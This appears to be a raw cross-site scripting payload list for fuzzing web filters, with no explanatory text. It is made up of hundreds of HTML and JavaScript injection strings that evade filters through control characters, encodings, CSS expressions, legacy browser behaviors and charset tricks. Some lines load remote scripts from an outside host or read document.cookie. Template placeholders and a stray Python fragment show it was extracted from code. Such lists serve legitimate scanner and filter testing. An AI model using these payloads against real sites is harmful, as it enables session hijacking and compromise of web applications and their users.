<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<object data="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<style>*[{}@import'%(css)s?]</style>X
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo}color=red;">XXX
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style=content:url(%(svg)s)></div>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<x style="behavior:url(%(sct)s)">
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>%(payload)s</script>
<script src=%(jscript)s></script>
<script language='javascript' src='%(jscript)s'></script>
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<SCRIPT SRC=%(jscript)s?<B>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav    ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<IMG SRC="javascript:javascript:alert(1)"
<iframe src=%(scriptlet)s <
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>@import'%(css)s';</STYLE>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src=%(jscript)s></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<embed type="image" src=%(scriptlet)s></embed>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
